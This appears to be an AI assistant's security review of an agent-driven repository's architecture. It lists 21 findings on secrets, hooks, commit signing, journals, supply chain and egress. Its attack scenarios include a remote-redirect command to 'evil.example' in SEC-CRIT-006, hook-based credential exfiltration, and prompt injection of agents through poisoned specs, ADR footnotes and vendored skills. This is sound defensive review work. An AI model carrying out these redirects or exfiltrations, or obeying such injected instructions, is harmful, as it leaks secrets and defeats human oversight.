## Findings deliverable (final assistant message)

I have read all the architecture documents. Now I'll produce the security review.

SEC-CRIT-001 — No secrets management architecture exists
The architecture defines a CI service account that owns test spreadsheets ([ADR-0003 §3](openspec/architecture/decisions/ADR-0003-appscript-runtime.md)), real Anthropic API tokens consumed by `packages/anthropic-client/` ([PHASE-3 scope](openspec/architecture/phases/PHASE-3-anthropic-client.md)), `clasp` push credentials ([PHASE-5 §2](openspec/architecture/phases/PHASE-5-first-appscript-project.md)), and a GitHub merge MCP that mutates remote state ([ADR-0005 §6 hook table](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md)). No ADR or phase defines where these secrets live, who reads them, rotation cadence, per-environment scoping, or revocation procedure. The security-model assumption being violated: any system using credentials needs a credential lifecycle. Concrete failure mode: a single Anthropic key is checked into `packages/anthropic-client/` config or smuggled into `.claude/settings.json` env, leaks via the always-committed journal (see SEC-CRIT-004), and the team has no rotation playbook because none was specified. This is the most security-deficient gap in the entire architecture today and blocks sign-off. Overlaps with STAKE's secrets theme but adds: there is not even a deferred ADR slot reserved for secrets — it is invisible in the gate inventory ([ADR-0008 §1](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md)).

SEC-CRIT-002 — Hooks run arbitrary code with no sandbox, identity, or capability declaration
[ADR-0005 §6](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) declares seven hooks that fire on every Edit/Write, every Bash, every git commit, every test run, every PR merge, plus Stop/SessionEnd. They execute Python scripts (`tools/trace/*.py`) with full ambient process privilege — the developer's shell, the developer's git credentials, the developer's GitHub MCP token, the developer's Anthropic key environment, and write access to the entire working tree. There is no uid separation, no container, no capability list, no allowlist of files the hook may touch, and no allowlist of network endpoints it may reach. Assumption violated: any code that runs automatically on every developer action is a privileged execution path and must be sandboxed. Concrete attack: a malicious PR modifies `tools/trace/journal_commit.py`; on reviewer's next commit it exfiltrates `~/.config/anthropic/` and rewrites `.git/config` to point at an attacker remote. The push hook then dutifully pushes to that remote. This is a textbook hostile-PR-via-hook attack and there is zero defense-in-depth.

SEC-CRIT-003 — Commit signing is not required
[ADR-0005 §3](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) makes mandatory trailers the integrity surface for commits. [ADR-0008 §6](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md) forbids `--no-gpg-sign`, but nothing in any document requires that commits be signed in the first place — a forbidden flag for a feature that is not on is moot. The traceability matrix and journal both derive trust from git history, yet any anonymous actor with write access to a branch can author commits with arbitrary `Task:`/`Requirements:`/`Phase:` trailers and arbitrary author identity. Assumption violated: an audit trail rooted in git is only as trustworthy as the cryptographic provenance of commits. Concrete failure: an agent's session is prompt-injected to fabricate a commit attributing work to a human reviewer, satisfies the trailer regex, passes `commit-trailers-valid`, and lands in the matrix as if a human approved it. There is no signature gate (`gpg-signed-commits` is absent from [ADR-0008 §1](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md)).

SEC-CRIT-004 — Session journals are committed to disk with no classification policy
[ADR-0005 §5](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) defines `.claude/journal/session-<id>.jsonl` events including `file_touch` (path, tool), `tests_run` (output parsed for new red/green), and `commit` (sha, trailers). [PHASE-0 §11](openspec/architecture/phases/PHASE-0-foundation.md) gitignores `.claude/journal/`, so the journal is local-only — but the architecture also describes it as "append-only sources of truth" ([ARCHITECTURE.md §7](openspec/architecture/ARCHITECTURE.md)). The matrix derived from this local-only file is committed. Assumption violated: data classification (secret/confidential/public) must be declared before storage location is chosen. Concrete failure modes: (a) `tests_run` parses real test stdout, which routinely contains tokens, response bodies, and PII pulled from test spreadsheets; that journal is on disk in cleartext with no encryption-at-rest requirement; (b) if a developer accidentally `git add -f .claude/`, secrets land in history; (c) gitignored "truth" means the matrix on origin cannot actually be reconstructed by anyone other than the original session — defeating the audit guarantee.

SEC-CRIT-005 — No supply-chain integrity for the 2.6 MB vendored BMAD blob
[ADR-0002 §1-4](openspec/architecture/decisions/ADR-0002-bmad-integration.md) pins BMAD v6.6.0 by version string in `_bmad/_config/manifest.yaml` and via `scripts/install_bmad.sh`. There is no checksum, no signature (sigstore / cosign / SLSA provenance), no in-toto attestation. The vendored 2.4 MB of skill markdown becomes executable through Claude Code's native skill system; an upstream supply-chain compromise of BMAD between install date and upgrade is undetectable. The `skill-removal-acknowledged` gate (§8) checks deletions but not additions or modifications. Assumption violated: any vendored third-party code that becomes execution surface needs cryptographic verification, not just a version string. Concrete attack: an attacker compromises a BMAD release tarball mirror, ships a malicious v6.6.0 that prompt-injects every Claude session to exfiltrate code on next push. The substrate PR diff is "large, expected; mostly vendored skill markdown" (§6) — exactly the diff humans rubber-stamp.

SEC-CRIT-006 — Hook push semantics enable accidental leakage to attacker-controlled remotes
[ADR-0005 §6 amendment 0001](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) declares that `PostToolUse(Bash:git commit)` pushes `HEAD` to origin automatically, and Stop/SessionEnd does the same. The "origin" remote is whatever git currently has configured. There is no validation that origin is the legitimate upstream; no public-key pinning of the remote host; no check that the push target is on an allowlist. Assumption violated: automated network egress must validate the destination. Concrete attack: an earlier malicious Edit (via prompt injection or hostile MCP response) sets `git remote set-url origin https://evil.example/...`; the next commit's hook autopushes all repo contents — including any local secrets in the working tree — to the attacker. There is no `origin-url-allowlist` gate in [ADR-0008 §1](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md).

SEC-CRIT-007 — No protected-branch policy is declared at the architecture level
[ADR-0008 §6](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md) says `--no-verify` is forbidden by "branch protection at the repository level for `main`" — but the architecture artifact never specifies what that branch protection contains (required reviewers, status checks, signed-commits-required, restrict-push-list, dismiss-stale-reviews). Assumption violated: enforcement that lives only in GitHub's UI and is not codified in the repo is unauditable and can be silently lowered by any admin. Concrete failure: a maintainer turns off "require status checks" for an emergency hotfix and forgets to re-enable it; the architecture has no detection mechanism. There is no `branch-protection-snapshot` gate that pulls the live ruleset and diffs against a committed canonical.

SEC-SER-008 — Agent identity is indistinguishable from developer identity
[ADR-0005 §3](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) commit trailers carry `Task`, `Requirements`, `Tests-Status`, `Phase`, and `Checkpoint`, but no trailer identifies whether the commit was authored by an agent session, which agent (Claude vs. another), which model version, or which session id. The journal has `session_id`; the commit does not link to it. Assumption violated: in a multi-actor system, distinguishing human commits from agent commits is a precondition for incident response. Concrete failure: a prompt-injection incident is suspected; investigators cannot scope blast radius because commits from the compromised session are not labelled. STAKE noted "agent vs developer" as a perspective; this finding adds the specific missing trailer (`Agent: <id>` or `Session: <id>`) and the gate that would enforce it.

SEC-SER-009 — Journal is append-only by convention, not by filesystem
[ADR-0005 §5](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) repeatedly calls the journal "append-only" but the storage is a plain `.jsonl` file in `.claude/journal/`. Nothing prevents `rm`, `truncate`, `sed -i`, or a malicious hook rewriting history. There is no hash chaining (each event committing to its predecessor's hash), no transparency log, no off-host shipping. Assumption violated: tamper-evident logs require either cryptographic chaining or external shipment. Concrete failure: a compromised session deletes its own journal to hide an exfiltration tool call; on resume the gap is invisible because session continuity is only inferred from the presence of files. Recommend: hash-chained entries plus periodic anchoring commit of the journal head hash.

SEC-SER-010 — No threat model document exists
The architecture has eight ADRs, six phase files, and an architecture narrative — none mention trust boundaries, attack surface enumeration, STRIDE / LINDDUN, or untrusted inputs. The closest discussion is the abstract "principle without a CI gate is a build failure" framing, which is integrity-only and ignores confidentiality, availability, and authorization. Assumption violated: every security-conscious organisation expects a written threat model before sign-off. Concrete failure: reviewers cannot tell which components are inside the trust boundary (BMAD skills? MCP servers? Anthropic responses? clasp credentials?) so they cannot reason about whether a given gap matters. This is documentation debt that blocks all downstream analysis.

SEC-SER-011 — Anthropic API responses are an untrusted input with no parsing perimeter
[ADR-0007 §3](openspec/architecture/decisions/ADR-0007-llm-stochastic-assertions.md) discusses schema invariants for correctness, not for security. LLM output is in practice attacker-controllable (prompt injection via tool-result feedback, web-fetch content, indirect injection through specs). It flows back through `packages/anthropic-client/` into agents whose tool calls run `Bash` and `Edit` against the repo. The architecture nowhere classifies LLM output as untrusted or requires a sanitization layer before it reaches tool-call surfaces. Assumption violated: any untrusted text reaching a code-execution surface needs a defense layer. Concrete attack: a spec file is poisoned with a hidden instruction; an agent loads the spec, the model's reply contains an executable Bash command, the hook auto-runs and writes secrets out. The "sandwich layer" of §3 is correctness-shaped, not security-shaped.

SEC-SER-012 — GitHub MCP is a high-blast-radius actor with no scope declaration
[ADR-0005 §6](openspec/architecture/decisions/ADR-0005-traceability-and-journaling.md) wires a hook to `PostToolUse(mcp__github__merge_pull_request)` — meaning the runtime is expected to have a GitHub MCP that can merge PRs. The MCP token's scope, the list of repositories it can touch, whether it can create releases, whether it can manage secrets, whether it can fork — none of this is constrained anywhere. Assumption violated: tokens for automation must follow least-privilege and have declared scope. Concrete failure: the MCP token has `repo` (full control) when only `pull_request:write` is needed; a compromised session deletes branches or rewrites release assets.

SEC-SER-013 — Network egress is unbounded and undocumented
The architecture makes outbound calls to: Anthropic API (PHASE-3), Sheets / Drive REST (PHASE-4, integration tier), Apps Script Execution API (ADR-0003, e2e tier), `clasp push` (PHASE-5), GitHub MCP (ADR-0005), BMAD upstream during install (`scripts/install_bmad.sh`), and the matrix's origin push (ADR-0005 amendment 0001). No ADR enumerates allowed endpoints, no egress proxy, no DNS allowlist. Assumption violated: a system with multiple outbound endpoints needs an egress policy to limit data exfiltration paths. Concrete failure: a compromised hook reaches any internet endpoint with the same ease it reaches `api.anthropic.com`.

SEC-SER-014 — `.claude/settings.json` is unsigned, repo-committed, and grants ambient capabilities
[ARCHITECTURE.md §3](openspec/architecture/ARCHITECTURE.md) and [REQ-ARCH-0008](openspec/architecture/ARCHITECTURE.md) make `.claude/settings.json` the declaration surface for permissions, env, and hooks. Any PR can modify it. There is no gate that diff-reviews additions to `permissions` or `env`, no signed-config requirement, no two-person approval on hook changes. Assumption violated: changes to authorization configuration deserve elevated scrutiny. Concrete attack: a PR adds `"allow": ["Bash(curl *)"]` to permissions and a benign-looking hook that uses it; merged, the next session can call any URL.

SEC-SER-015 — Stochastic tier intentionally hits real production Anthropic API in CI
[ADR-0007 §1-2](openspec/architecture/decisions/ADR-0007-llm-stochastic-assertions.md) bans recorded fixtures and requires real API calls from the stochastic tier, including on nightly CI runs. This means production-grade API keys live in CI secrets and are exercised in every nightly. Combined with no rotation policy (SEC-CRIT-001), no log sanitization (SEC-CRIT-004), and unbounded egress (SEC-SER-013), the blast radius of a CI compromise is the team's full Anthropic spend plus all data sent over the API. Assumption violated: high-value credentials should be used only by the minimum number of execution contexts. Concrete failure: a malicious dependency in `packages/anthropic-client/` reads the env, posts the key to an attacker; the only mitigation listed is `@cost-budget` (which detects burn-down after the fact).

SEC-SER-016 — Pre-commit / pre-receive hooks are local-only and bypassable
[ADR-0008 §5](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md) puts `index-up-to-date`, `matrix-drift`, and `commit-trailers-valid` in pre-commit; `commit-trailers-valid` also appears in the table as "pre-receive hook" ([ADR-0008 §1](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md)). Pre-receive on GitHub is not available outside Enterprise Server; on github.com it does not exist. So the only enforcement is client-side (which `--no-verify` defeats, and `--no-verify` is "forbidden" only by policy in CLAUDE.md, not by infrastructure). Assumption violated: client-side enforcement against a possibly-malicious client is not enforcement. Concrete failure: a hostile contributor disables hooks locally, pushes commits with forged trailers; CI must redundantly enforce on every PR (which it partially does, but the table conflates "pre-receive" with what github.com cannot offer).

SEC-PROC-017 — Checkpoint commits silently bypass an undocumented gate subset
[CLAUDE.md](CLAUDE.md) and [ADR-0008 §6](openspec/architecture/decisions/ADR-0008-ci-gates-and-phase-exits.md) state checkpoint commits are exempt from a subset of gates listed in `tools/trace/checkpoint_exemptions.yaml`. That file does not exist yet (PHASE-2 deliverable), and no ADR enumerates the exempted gates. Assumption violated: any sanctioned bypass must enumerate exactly what is bypassed. Concrete failure: PHASE-2 author chooses to exempt `commit-trailers-valid` for convenience; a malicious actor stamps every commit `Checkpoint: true` to slip past `red-before-green`.

SEC-PROC-018 — No incident response or disclosure process
Not a single ADR or phase mentions: how a vulnerability is reported, who triages it, how a compromised key is rotated, how a malicious commit is reverted across the matrix, how the journal records an incident, or how downstream consumers (Apps Script deployments) are notified. STAKE noted incident response gaps; this adds that even the file location for a future `SECURITY.md` is not reserved in [ARCHITECTURE.md §3](openspec/architecture/ARCHITECTURE.md).

SEC-PROC-019 — Anti-aliasing lint is a side-channel for spec-content fingerprinting
[ADR-0004 §4](openspec/architecture/decisions/ADR-0004-spec-storage-discipline.md) computes pairwise n-gram similarity across all spec descriptions; the threshold lives in `tools/spec_lint/config.yaml`. If specs ever contain customer-confidential PRD content, this n-gram comparison is itself a data-leakage surface in CI logs (similarity reports may quote text fragments). Minor and not a blocker, but should be addressed by either redacting fragments in reports or asserting that specs are not confidential.

SEC-PROC-020 — REQ-ARCH-0006 forbids executable code under `openspec/architecture/` but doesn't forbid YAML-embedded directives
[REQ-ARCH-0006](openspec/architecture/ARCHITECTURE.md) prevents code there, but architecture markdown is loaded into LLM context every session as governance. Indirect prompt injection through architecture text is unaddressed. Concrete failure: a PR adds a footnote to an ADR that instructs the agent to ignore a specific gate "for compatibility"; the agent follows the instruction in subsequent sessions until a human notices.

SEC-PROC-021 — Phase 5 service-account ownership is undefined
[PHASE-5 §2](openspec/architecture/phases/PHASE-5-first-appscript-project.md) references a "CI service account" owning the `dev` GAS deployment. Who provisions, who has the credentials, whether MFA is required, what happens when the account is decommissioned — all undefined. Same issue as SEC-CRIT-001 but specifically for Google identities.

Summary
21 findings: 7 CRIT, 9 SER, 5 PROC. The most security-deficient subsystem is the **hook execution surface defined by ADR-0005** — it concentrates the largest number of critical findings (SEC-CRIT-002 unsandboxed execution, SEC-CRIT-003 commit signing absent though derived trust runs through this surface, SEC-CRIT-004 cleartext journal, SEC-CRIT-006 auto-push to whatever `origin` happens to be, plus SER-009 non-tamper-evident logs and SER-016 bypassable local-only hooks). The hook layer is the only place in the architecture where agent-controlled actions automatically mutate the commit graph and reach the network, yet it has no sandbox, no identity, no destination allowlist, and no integrity chaining. No sign-off is feasible until at minimum SEC-CRIT-001 (secrets), SEC-CRIT-002 (hook sandbox), SEC-CRIT-003 (commit signing), and SEC-CRIT-005 (BMAD integrity) have ADRs and gate entries.
